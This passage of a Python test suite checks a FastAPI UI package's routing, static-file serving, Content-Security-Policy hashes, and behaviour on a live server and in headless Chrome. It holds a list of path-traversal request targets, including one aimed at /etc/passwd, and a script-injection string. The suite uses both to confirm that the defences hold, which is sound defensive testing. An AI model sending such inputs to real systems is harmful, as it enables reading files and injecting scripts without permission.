    assert [name for path, _, name in route_table(app) if path.startswith("/d/")] == [
        "ui_dept_redirect", "ui_dept", "ui_dept_library", "ui_dept_library_redirect"]


def test_the_library_page_is_read_and_hashed_once_with_the_team_page(pages, static, monkeypatch):
    reads = []
    original = routes_mod.csp_header
    monkeypatch.setattr(routes_mod, "csp_header", lambda hashes: reads.append(1) or original(hashes))
    app, _ = make_app(pages, static)
    client = TestClient(app, follow_redirects=False)
    for path in ("/d/web/", "/d/web/library", "/d/docs/library", "/d/web/"):
        assert client.get(path).status_code == 200
    assert reads == [1]                                               # one page file, so one read and one hash for all of them


def test_the_pages_are_not_part_of_the_openapi_schema(pages):
    app, _ = make_app(pages)
    assert app.openapi()["paths"] == {}


def test_a_bad_token_fails_when_the_router_is_built(pages):
    with pytest.raises(ValidationError) as caught:
        build_router(token="short-token-15!", department=Lookup(), version=VERSION, pages_dir=pages)
    assert "short-token-15!" not in str(caught.value)


@pytest.mark.parametrize("broken", ["missing", "no_marker", "two_markers", "not_utf8", "directory"])
def test_a_page_file_that_cannot_be_served_is_a_500_without_a_traceback_or_a_path(tmp_path, tree, broken, caplog):
    pages, static = tree
    target = pages / "home.html"
    if broken == "missing":
        target.unlink()
    elif broken == "no_marker":
        target.write_text(HOME_PAGE.replace(MARKER, ""), encoding="utf-8")
    elif broken == "two_markers":
        target.write_text(HOME_PAGE + MARKER, encoding="utf-8")
    elif broken == "not_utf8":
        target.write_bytes(b"\xff\xfe<p>" + MARKER.encode())
    else:
        target.unlink()
        target.mkdir()
    app, _ = make_app(pages, static)
    client = TestClient(app, follow_redirects=False, raise_server_exceptions=True)
    with caplog.at_level("ERROR", logger="sutra_app.ui"):
        response = client.get("/")
    assert response.status_code == 500
    assert response.headers["content-type"].startswith("text/plain")
    assert response.headers["cache-control"] == "no-store"
    assert "home.html" in response.text and str(tmp_path) not in response.text
    assert "page home.html cannot be served" in caplog.text
    assert client.get("/d/web/").status_code == 200  # the other page is unaffected
    assert client.get("/d/nosuch/").status_code == 404


def test_a_page_file_that_appears_later_is_served_without_a_restart(tree):
    pages, static = tree
    (pages / "home.html").unlink()
    app, _ = make_app(pages, static)
    client = TestClient(app, follow_redirects=False)
    assert client.get("/").status_code == 500
    (pages / "home.html").write_text(HOME_PAGE, encoding="utf-8")
    assert client.get("/").status_code == 200


# ------------------------------------------------------------------------------------------------------------------
# Static files at /ui
# ------------------------------------------------------------------------------------------------------------------
def test_static_files_carry_the_cache_rules(client):
    js = client.get("/ui/js/sutra_ctx.js")
    assert js.status_code == 200 and js.text == "window.SutraCtx = {};\n"
    assert js.headers["cache-control"] == "no-cache"
    assert "javascript" in js.headers["content-type"]
    css = client.get("/ui/css/j2.css")
    assert css.status_code == 200 and css.headers["cache-control"] == "no-cache"
    assert css.headers["content-type"].startswith("text/css")
    d3 = client.get("/ui/vendor/d3.min.js")
    assert d3.status_code == 200 and d3.headers["cache-control"] == "max-age=3600"
    for response in (js, css, d3):
        assert response.headers["etag"]


def test_a_conditional_request_gets_a_304_that_keeps_the_cache_rule(client):
    for path, rule in (("/ui/js/sutra_ctx.js", "no-cache"), ("/ui/vendor/d3.min.js", "max-age=3600")):
        etag = client.get(path).headers["etag"]
        again = client.get(path, headers={"If-None-Match": etag})
        assert again.status_code == 304
        assert again.headers["cache-control"] == rule
        assert client.get(path, headers={"If-None-Match": '"other"'}).status_code == 200


def test_the_vendor_rule_is_for_the_vendor_folder_only(tmp_path, static):
    (static / "js" / "vendor").mkdir()
    (static / "js" / "vendor" / "x.js").write_text("x\n")
    (static / "vendor-x.js").write_text("x\n")
    (static / "fonts").mkdir()
    (static / "fonts" / "f.woff2").write_bytes(b"\x00")
    app, _ = make_app(tmp_path / "pages_unused", static)
    client = TestClient(app)
    for path in ("/ui/js/vendor/x.js", "/ui/vendor-x.js", "/ui/fonts/f.woff2"):
        assert client.get(path).headers["cache-control"] == "no-cache", path
    assert client.get("/ui/vendor/../js/sutra_ctx.js").headers["cache-control"] == "no-cache"


TRAVERSAL = [
    "/ui/%2e%2e/pages/home.html",
    "/ui/%2E%2E/pages/home.html",
    "/ui/..%2fpages/home.html",
    "/ui/%2e%2e%2fpages%2fhome.html",
    "/ui/js/..%2f..%2fpages/home.html",
    "/ui/%252e%252e/pages/home.html",
    "/ui/..%5cpages%5chome.html",
    "/ui/%2e%2e%5cpages%5chome.html",
    "/ui//etc/passwd",
    "/ui/%2fetc/passwd",
    "/ui/pages/home.html",
    "/ui/js/%00.js",
    "/ui/js/sutra_ctx.js%00.png",
    "/ui/",
    "/ui/js/",
    "/ui/js",
    "/ui/missing.js",
]


@pytest.mark.parametrize("target", TRAVERSAL)
def test_static_never_serves_a_page_or_a_file_outside_its_folder(client, target):
    response = client.get(target)
    assert response.status_code == 404 or response.status_code in (307, 308) and "/ui/" in response.headers["location"]
    assert "SUTRA-BOOT" not in response.text and "root:" not in response.text
    assert "sutra-boot" not in response.text


def test_static_follows_no_symlink_out_of_its_folder(tree):
    pages, static = tree
    (static / "js" / "leak.html").symlink_to(pages / "home.html")
    (static / "js" / "leakdir").symlink_to(pages, target_is_directory=True)
    app, _ = make_app(pages, static)
    client = TestClient(app)
    assert client.get("/ui/js/leak.html").status_code == 404
    assert client.get("/ui/js/leakdir/home.html").status_code == 404
    assert client.get("/ui/js/sutra_ctx.js").status_code == 200


def test_static_answers_get_and_head_only(client):
    assert client.head("/ui/js/sutra_ctx.js").status_code == 200
    for method in ("POST", "PUT", "PATCH", "DELETE"):
        response = client.request(method, "/ui/js/sutra_ctx.js")
        assert response.status_code == 405, method
        assert response.headers["allow"] == "GET, HEAD"


def test_a_missing_static_directory_is_404s_and_a_warning_not_a_500(tmp_path, pages, caplog):
    app = FastAPI()
    with caplog.at_level("WARNING", logger="sutra_app.ui"):
        mount_static(app, tmp_path / "nope")
    assert "does not exist" in caplog.text and "every /ui request will answer 404" in caplog.text
    client = TestClient(app, raise_server_exceptions=True)
    assert client.get("/ui/js/sutra_ctx.js").status_code == 404
    assert client.get("/ui/").status_code == 404


def test_an_existing_static_directory_mounts_silently(static, caplog):
    with caplog.at_level("WARNING", logger="sutra_app.ui"):
        mount_static(FastAPI(), static)
    assert caplog.text == ""


# ------------------------------------------------------------------------------------------------------------------
# mount(app, services)
# ------------------------------------------------------------------------------------------------------------------
def route_table(app: FastAPI) -> list[tuple]:
    """Every route of the app as (path, methods, name), included routers flattened (FastAPI keeps them lazily)."""
    return [(ctx.path, tuple(sorted(ctx.methods or ())), ctx.name) for ctx in iter_route_contexts(app.routes)]


class Strict:
    """A services object that has only the given members and records every attribute read."""

    def __init__(self, **members):
        object.__setattr__(self, "_members", members)
        object.__setattr__(self, "reads", [])

    def __getattr__(self, name):
        self.reads.append(name)
        try:
            return self._members[name]
        except KeyError:
            raise AttributeError(f"the UI read {name!r}, which a services object need not have") from None


def strict_services(lookup, token=TOKEN, version=VERSION):
    settings = Strict(token=token)
    return Strict(settings=settings, version=version, department=lookup), settings


def test_mount_reads_only_settings_token_version_and_department(tree, monkeypatch):
    pages, static = tree
    monkeypatch.setattr(ui, "PAGES_DIR", pages)
    monkeypatch.setattr(ui, "STATIC_DIR", static)
    lookup = Lookup()
    services, settings = strict_services(lookup)
    app = FastAPI()
    mount(app, services)
    assert set(services.reads) == {"settings", "version", "department"}
    assert settings.reads == ["token"]
    client = TestClient(app, follow_redirects=False)
    assert boot_of(client.get("/d/web/").text)["token"] == TOKEN
    assert boot_of(client.get("/").text)["version"] == VERSION
    assert client.get("/ui/js/sutra_ctx.js").status_code == 200
    assert client.get("/favicon.ico").status_code == 204
    assert lookup.asked == ["web"]
    assert set(services.reads) == {"settings", "version", "department"}  # serving requests read nothing more


def test_a_second_mount_adds_nothing(tree, monkeypatch):
    pages, static = tree
    monkeypatch.setattr(ui, "PAGES_DIR", pages)
    monkeypatch.setattr(ui, "STATIC_DIR", static)
    services, _ = strict_services(Lookup())
    app = FastAPI()
    mount(app, services)
    table, count = route_table(app), len(app.router.routes)
    assert [name for _, _, name in table].count("ui_home") == 1
    mount(app, services)
    other, _ = strict_services(Lookup(), token="o" * 40)
    mount(app, other)  # even another services object: the first mount stands
    assert route_table(app) == table and len(app.router.routes) == count
    assert boot_of(TestClient(app).get("/").text)["token"] == TOKEN


def test_each_app_is_mounted_on_its_own(tree, monkeypatch):
    pages, static = tree
    monkeypatch.setattr(ui, "PAGES_DIR", pages)
    monkeypatch.setattr(ui, "STATIC_DIR", static)
    first, second = FastAPI(), FastAPI()
    mount(first, strict_services(Lookup())[0])
    assert "ui_home" not in [name for _, _, name in route_table(second)]
    mount(second, strict_services(Lookup())[0])
    assert "ui_home" in [name for _, _, name in route_table(second)]


def test_mount_with_a_short_token_adds_nothing(tree, monkeypatch):
    pages, static = tree
    monkeypatch.setattr(ui, "PAGES_DIR", pages)
    monkeypatch.setattr(ui, "STATIC_DIR", static)
    app = FastAPI()
    before = route_table(app)
    with pytest.raises(ValidationError):
        mount(app, strict_services(Lookup(), token="x" * 15)[0])
    assert route_table(app) == before
    mount(app, strict_services(Lookup())[0])  # a later good call still mounts
    assert len(route_table(app)) > len(before)


def test_mount_registers_the_pages_and_the_static_mount_at_the_package_folders():
    app = FastAPI()
    mount(app, strict_services(Lookup())[0])
    table = route_table(app)
    paths = [path for path, _, _ in table]
    for expected in ("/", "/d/{dept}", "/d/{dept}/", "/d/{dept}/library", "/d/{dept}/library/", "/console", "/favicon.ico", "/ui"):
        assert paths.count(expected) == 1, expected
    assert ("/ui", (), "ui") in table
    assert ui.PAGES_DIR.name == "pages" and ui.STATIC_DIR.name == "static"
    assert ui.PAGES_DIR.parent == ui.STATIC_DIR.parent == Path(ui.__file__).parent  # siblings: static never holds pages
    assert ui.PAGES_DIR is routes_mod.PAGES_DIR and ui.STATIC_DIR is routes_mod.STATIC_DIR
    client = TestClient(app)
    for target in ("/ui/pages/home.html", "/ui/%2e%2e/pages/home.html", "/ui/..%2fpages%2fj2_ui.html"):
        assert client.get(target).status_code == 404, target  # whether or not the folders exist yet


# ------------------------------------------------------------------------------------------------------------------
# What the package is and is not (S3-web-01, -02)
# ------------------------------------------------------------------------------------------------------------------
def test_there_is_no_web_alias_no_second_injector_and_no_second_lookup():
    package = Path(ui.__file__).parent
    assert not (package.parent / "web.py").exists() and not (package.parent / "web").exists()
    for name in ("inject_boot", "lookup_dept", "DeptInfo"):
        assert not hasattr(ui, name) and not hasattr(boot_mod, name) and not hasattr(routes_mod, name)
    assert not hasattr(ui, "ui_dir")
    sources = "".join((package / name).read_text() for name in ("__init__.py", "boot.py", "routes.py"))
    assert "inject_boot(" not in sources and "lookup_dept(" not in sources


def test_the_package_exports_its_documented_names():
    for name in ("mount", "build_router", "mount_static", "render_page", "inline_script_hashes", "csp_header",
                 "BootContext", "PAGES_DIR", "STATIC_DIR"):
        assert name in ui.__all__ and hasattr(ui, name)
    assert render_page is boot_mod.render_page and csp_header is boot_mod.csp_header
    assert build_router is routes_mod.build_router and mount_static is routes_mod.mount_static


def test_the_package_imports_no_other_part_of_the_app():
    """The UI reads the department through a local protocol and imports neither the orchestrator nor the engine."""
    package = Path(ui.__file__).parent
    for name in ("__init__.py", "boot.py", "routes.py"):
        for node in ast.walk(ast.parse((package / name).read_text())):
            if isinstance(node, ast.ImportFrom):
                module = ("." * node.level) + (node.module or "")
                assert not module.startswith("sutra_app") or module.startswith("sutra_app.ui"), (name, module)
                assert node.level in (0, 1), (name, module)
                assert node.level == 0 or (node.module or "") in ("boot", "routes", ""), (name, module)
            elif isinstance(node, ast.Import):
                assert not any(alias.name.startswith("sutra_app") for alias in node.names), name


def test_the_signatures_are_the_documented_ones():
    import inspect

    sig = inspect.signature(build_router)
    assert [(p.name, p.kind.name) for p in sig.parameters.values()] == [
        ("token", "KEYWORD_ONLY"), ("department", "KEYWORD_ONLY"), ("version", "KEYWORD_ONLY"), ("pages_dir", "KEYWORD_ONLY"),
    ]
    assert sig.parameters["pages_dir"].default == ui.PAGES_DIR
    assert inspect.signature(mount_static).parameters["static_dir"].default == ui.STATIC_DIR
    assert list(inspect.signature(mount).parameters) == ["app", "services"]
    assert list(inspect.signature(render_page).parameters) == ["html", "boot"]
    assert list(inspect.signature(inline_script_hashes).parameters) == ["html"]
    assert list(inspect.signature(csp_header).parameters) == ["hashes"]


# ------------------------------------------------------------------------------------------------------------------
# The real page files and style sheets, once the packages that own them have merged
# ------------------------------------------------------------------------------------------------------------------
OWNER = {"j2_ui.html": "UI-2", "home.html": "UI-7"}
EXTERNAL_REF = re.compile(r"""(?:src|href|action|poster|data-src)\s*=\s*["']\s*(?:https?:)?//""", re.IGNORECASE)
EXTERNAL_CSS = re.compile(r"""url\(\s*["']?\s*(?:https?:)?//|@import\s+(?:url\(\s*)?["']?\s*(?:https?:)?//""", re.IGNORECASE)


def real_page(name: str) -> str:
    path = ui.PAGES_DIR / name
    if not path.is_file():
        pytest.skip(f"{path.relative_to(ui.PAGES_DIR.parent.parent.parent)} is added by {OWNER[name]} and is not merged yet")
    return path.read_text(encoding="utf-8")


@pytest.mark.parametrize("name", sorted(OWNER))
def test_real_page_has_one_marker_and_no_external_url(name):
    html = real_page(name)
    assert html.count(MARKER) == 1
    assert not EXTERNAL_REF.search(html)
    assert not EXTERNAL_CSS.search(html)  # inline <style> and style attributes too


@pytest.mark.parametrize("name,route", [("j2_ui.html", "/d/web/"), ("home.html", "/")])
def test_real_page_is_served_under_the_hashes_of_its_own_inline_scripts(name, route):
    html = real_page(name)
    app = FastAPI()
    lookup = Lookup()
    app.include_router(build_router(token=TOKEN, department=lookup, version=VERSION))  # the package's own folders
    response = TestClient(app, follow_redirects=False).get(route)
    assert response.status_code == 200
    scripts = re.findall(r"<script>(.*?)</script>", html, re.S)  # attribute-less inline scripts, found independently
    expected = [source_hash(text.replace("\r\n", "\n").replace("\r", "\n")) for text in scripts]
    policy = directives(response.headers["content-security-policy"])
    assert policy["script-src"] == ["'self'", *expected]
    assert "'unsafe-inline'" not in policy["script-src"] and "'unsafe-inline'" in policy["style-src"]
    if name == "j2_ui.html":
        assert len(expected) == 2  # the first-paint theme script and the page script, as in J2
    assert len(boot_of(response.text)) == 7
    assert BOOT_BLOCK.sub(MARKER, response.text.replace("\r\n", "\n")) == html.replace("\r\n", "\n")


def test_the_real_department_page_is_the_library_page_too_with_one_policy():
    html = real_page("j2_ui.html")
    app = FastAPI()
    app.include_router(build_router(token=TOKEN, department=Lookup(), version=VERSION))
    client = TestClient(app, follow_redirects=False)
    team, library = client.get("/d/web/"), client.get("/d/web/library")
    assert team.status_code == library.status_code == 200
    assert library.text == team.text and library.headers["content-security-policy"] == team.headers["content-security-policy"]
    assert BOOT_BLOCK.sub(MARKER, library.text.replace("\r\n", "\n")) == html.replace("\r\n", "\n")
    assert boot_of(library.text)["dept"] == "web" and client.get("/d/web/library/?q=a").headers["location"] == "/d/web/library?q=a"


def test_real_style_sheets_have_no_external_url():
    sheets = sorted((ui.STATIC_DIR / "css").glob("*.css")) if (ui.STATIC_DIR / "css").is_dir() else []
    if not sheets:
        pytest.skip("sutra_app/ui/static/css has no style sheet yet (UI-2 adds j2.css)")
    for sheet in sheets:
        assert not EXTERNAL_CSS.search(sheet.read_text(encoding="utf-8")), sheet.name


def test_real_static_files_are_served_as_documented():
    if not (ui.STATIC_DIR / "js" / "sutra_ctx.js").is_file() or not (ui.STATIC_DIR / "vendor" / "d3.min.js").is_file():
        pytest.skip("sutra_ctx.js (UI-3) and vendor/d3.min.js (UI-2) are not merged yet")
    app = FastAPI()
    mount_static(app)
    client = TestClient(app)
    assert client.get("/ui/js/sutra_ctx.js").headers["cache-control"] == "no-cache"
    assert client.get("/ui/vendor/d3.min.js").headers["cache-control"] == "max-age=3600"
    assert client.get("/ui/%2e%2e/pages/home.html").status_code == 404


# ------------------------------------------------------------------------------------------------------------------
# A real server: raw request targets, HEAD and threads (what the test client cannot show)
# ------------------------------------------------------------------------------------------------------------------
class LiveServer:
    def __init__(self, app):
        import uvicorn

        self.server = uvicorn.Server(uvicorn.Config(app, host="127.0.0.1", port=0, log_level="warning", lifespan="off"))
        self.thread = threading.Thread(target=self.server.run, daemon=True)
        self.port = 0

    def __enter__(self):
        self.thread.start()
        deadline = time.monotonic() + 10
        while not self.server.started:
            if time.monotonic() > deadline or not self.thread.is_alive():
                raise RuntimeError("the test server did not start")
            time.sleep(0.01)
        self.port = self.server.servers[0].sockets[0].getsockname()[1]
        return self

    def __exit__(self, *exc):
        self.server.should_exit = True
        self.thread.join(10)

    def request(self, target: str, method: str = "GET"):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        try:
            conn.request(method, target)  # the target goes out exactly as written: no client-side normalising
            response = conn.getresponse()
            return response.status, {k.lower(): v for k, v in response.getheaders()}, response.read()
        finally:
            conn.close()


@pytest.fixture(scope="module")
def live(tmp_path_factory):
    pages, static = build_tree(tmp_path_factory.mktemp("live"))
    (pages.parent / "secret.txt").write_text("outside both folders\n")
    app, _ = make_app(pages, static)
    with LiveServer(app) as server:
        yield server


def test_live_pages_head_and_content_length(live):
    status, headers, body = live.request("/d/web/")
    assert status == 200 and int(headers["content-length"]) == len(body) > 0
    assert headers["content-security-policy"] == expected_csp(J2_HASHES)
    assert boot_of(body.decode())["dept"] == "web"
    for target in ("/", "/d/web/", "/favicon.ico"):
        get_status, get_headers, _ = live.request(target)
        head_status, head_headers, head_body = live.request(target, "HEAD")
        assert head_status == get_status and head_body == b""
        assert head_headers.get("content-security-policy") == get_headers.get("content-security-policy")
        assert head_headers.get("cache-control") == get_headers.get("cache-control")
    assert live.request("/d/web", "HEAD")[0] == 308


@pytest.mark.parametrize(
    "target", ["/ui/../pages/home.html", "/ui/js/../../pages/home.html", "/ui/js/../../secret.txt", "/ui/../secret.txt"] + TRAVERSAL
)
def test_live_server_never_serves_outside_the_static_folder(live, target):
    status, headers, body = live.request(target)
    assert status in (307, 308, 404), target
    assert b"SUTRA-BOOT" not in body and b"outside both folders" not in body and b"sutra-boot" not in body


def test_live_server_serves_the_static_files(live):
    status, headers, body = live.request("/ui/js/sutra_ctx.js")
    assert (status, headers["cache-control"], body) == (200, "no-cache", b"window.SutraCtx = {};\n")
    assert live.request("/ui/vendor/d3.min.js")[1]["cache-control"] == "max-age=3600"


def test_live_server_answers_many_threads_the_same(live):
    results, errors = [], []

    def hammer():
        try:
            for path in ("/d/web/", "/", "/d/docs/", "/d/nosuch/"):
                status, headers, body = live.request(path)
                results.append((path, status, headers.get("content-security-policy"), len(body)))
        except Exception as exc:  # noqa: BLE001 - reported below
            errors.append(repr(exc))

    threads = [threading.Thread(target=hammer) for _ in range(8)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join(30)
    assert not errors
    assert len(results) == 32
    for path, status, csp, _ in results:
        assert status == (404 if path == "/d/nosuch/" else 200)
        assert csp == expected_csp({"/d/web/": J2_HASHES, "/d/docs/": J2_HASHES, "/": HOME_HASHES}.get(path, ()))


# ------------------------------------------------------------------------------------------------------------------
# A real browser (opt in: SUTRA_BROWSER=1): the hashes really let the inline scripts run, and nothing else
# ------------------------------------------------------------------------------------------------------------------
def find_chrome() -> str | None:
    for candidate in (os.environ.get("SUTRA_CHROME"), "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
                      shutil.which("google-chrome"), shutil.which("chromium"), shutil.which("chromium-browser")):
        if candidate and os.path.exists(candidate):
            return candidate
    return None


def chrome_dom(chrome: str, url: str, profile: Path) -> str:
    done = subprocess.run(
        [chrome, "--headless=new", "--disable-gpu", "--no-first-run", f"--user-data-dir={profile}",
         "--virtual-time-budget=3000", "--dump-dom", url],
        capture_output=True, text=True, timeout=90, start_new_session=True,
    )
    return done.stdout


def paragraph(dom: str) -> str | None:
    """The text of <p id="r"> in a dumped DOM: what the page's script left there."""
    found = re.search(r'<p id="r">(.*?)</p>', dom, re.S)
    return found.group(1) if found else None


BROWSER_SCRIPT = (  # several lines on purpose: the line endings of the file are part of the text that is hashed
    '\nvar b = JSON.parse(document.getElementById("sutra-boot").textContent);\n'
    'document.getElementById("r").textContent = "ran:" + b.dept + ":" + b.dept_label.length;\n'
)
BROWSER_PAGE = (
    f'<!doctype html><html><head><meta charset="utf-8">{MARKER}</head>\n'
    f'<body><p id="r">blocked</p>\n<script>{BROWSER_SCRIPT}</script>\n</body></html>\n'
)


@pytest.mark.browser
@pytest.mark.parametrize("endings", ["\n", "\r\n", "\r"])
def test_chrome_runs_the_hashed_inline_script_whatever_the_line_endings(tmp_path, endings):
    chrome = find_chrome()
    if chrome is None:
        pytest.skip("Chrome is not installed (set SUTRA_CHROME)")
    pages, _ = build_tree(tmp_path)
    (pages / "j2_ui.html").write_bytes(BROWSER_PAGE.replace("\n", endings).encode())
    label = "</script><script>document.getElementById('r').textContent='injected'</script>"
    app, _ = make_app(pages, lookup=Lookup({"web": Row("web", label)}))
    with LiveServer(app) as server:
        dom = chrome_dom(chrome, f"http://127.0.0.1:{server.port}/d/web/", tmp_path / "profile")
    # the script ran, so its hash was accepted, and it read the boot block back whole
    assert paragraph(dom) == f"ran:web:{len(label)}", dom[:600]
    # the hostile label stayed text inside the JSON block: the page has the block and its one script, no more
    assert dom.count("<script") == 2, dom[:600]


@pytest.mark.browser
def test_chrome_blocks_an_inline_script_the_hashes_do_not_name(tmp_path):
    chrome = find_chrome()
    if chrome is None:
        pytest.skip("Chrome is not installed (set SUTRA_CHROME)")
    app = FastAPI()

    @app.get("/page")
    def page():
        from fastapi.responses import HTMLResponse

        served = BROWSER_PAGE.replace(BROWSER_SCRIPT, BROWSER_SCRIPT.replace("ran:", "tampered:"))
        policy = csp_header(inline_script_hashes(BROWSER_PAGE))  # the policy of the original page
        return HTMLResponse(render_page(served, BootContext(page="home", token=TOKEN, version=VERSION)),
                            headers={"Content-Security-Policy": policy})

    with LiveServer(app) as server:
        dom = chrome_dom(chrome, f"http://127.0.0.1:{server.port}/page", tmp_path / "profile")
    assert paragraph(dom) == "blocked", dom[:600]  # the changed script did not run
